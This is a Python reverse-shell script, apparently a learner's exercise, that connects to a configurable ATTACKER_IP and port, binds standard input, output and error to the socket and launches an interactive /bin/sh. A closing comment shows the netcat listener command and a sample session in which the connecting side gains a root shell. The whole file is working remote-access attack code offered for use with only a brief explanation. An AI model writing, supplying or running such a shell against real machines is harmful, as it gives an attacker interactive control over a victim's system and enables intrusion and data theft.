#!/usr/bin/python3
import socket
import subprocess
import os 

"""
Reverse shell: The target machine connects back to the attacker's machine, 
which is listening on an open port for incoming connections.
"""

ATTACKER_IP = "127.0.0.1"  # Change this to your attacker's IP address
ATTACKER_PORT = 8080        # Change the port if necessary

try:
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the attacker's machine
    sock.connect((ATTACKER_IP, ATTACKER_PORT))

    # Send a message indicating successful connection
    sock.send(b'[*] Connection Established\n')

    # Redirect standard input, output, and error to the socket
    os.dup2(sock.fileno(), 0)  # stdin
    os.dup2(sock.fileno(), 1)  # stdout
    os.dup2(sock.fileno(), 2)  # stderr

    # Start an interactive shell
    subprocess.run(["/bin/sh", "-i"])

except Exception as e:
    print(f"Connection failed: {e}")

finally:
    sock.close()  # Ensure socket is closed after execution



'''
The output on linux:
Run the netcat listener to get a connection 
# nc -lvnp 8080     
listening on [any] 8080 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59726
[*] Connection Established
# pwd
/home/kali/python/network
# whoami
root
# ls
reverse_shell.py

